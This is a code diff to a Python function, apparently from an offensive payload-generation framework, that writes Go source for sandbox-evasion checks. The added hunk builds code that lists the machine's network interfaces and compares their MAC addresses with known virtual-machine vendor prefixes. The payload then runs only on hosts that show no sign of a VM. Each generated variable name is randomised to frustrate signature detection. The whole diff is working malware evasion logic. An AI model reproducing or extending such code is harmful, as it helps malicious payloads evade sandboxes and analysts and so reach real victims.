@@ -786,6 +786,27 @@ def senecas_games(evasion_payload):
             check_code += '}\n'
             check_code += 'if (' + count_running_procs + ' >= ' + min_processes + ') {\n'
             num_tabs_required += 1
+        
+        if evasion_payload.required_options["BADMACS"][0].lower() != 'false':
+            
+            evd_sandbox = evasion_helpers.randomString()
+            bad_addrs = evasion_helpers.randomString()
+            nics = evasion_helpers.randomString()
+            single_nic = evasion_helpers.randomString()
+            bad_mac = evasion_helpers.randomString()
+
+            check_code += evd_sandbox + ' := make([]net.HardwareAddr, 0)\n'
+            check_code += bad_addrs + ' := [...]string{`00:0C:29`, `00:1C:14`, `00:50:56`, `00:05:69`, `08:00:27`}\n'
+            check_code += nics + ', _ := net.Interfaces()\n'
+            check_code += 'for _, ' + single_nic + ' := range ' + nics + ' {\n'
+            check_code += '\tfor _, ' + bad_mac + ' := range ' + bad_addrs + ' {\n'
+            check_code += '\t\tif strings.Contains(strings.ToLower(' + single_nic + '.HardwareAddr.String()), strings.ToLower(' + bad_mac + ')) {\n'
+            check_code += '\t\t\t' + evd_sandbox + ' = append(' + evd_sandbox + ', ' + single_nic + '.HardwareAddr)\n'
+            check_code += '\t\t}\n'
+            check_code += '\t}\n'
+            check_code += '}\n'
+            check_code += 'if len(' + evd_sandbox + ') == 0 {\n'
+            num_tabs_required += 1
 
         # Return check information
         return check_code, num_tabs_required
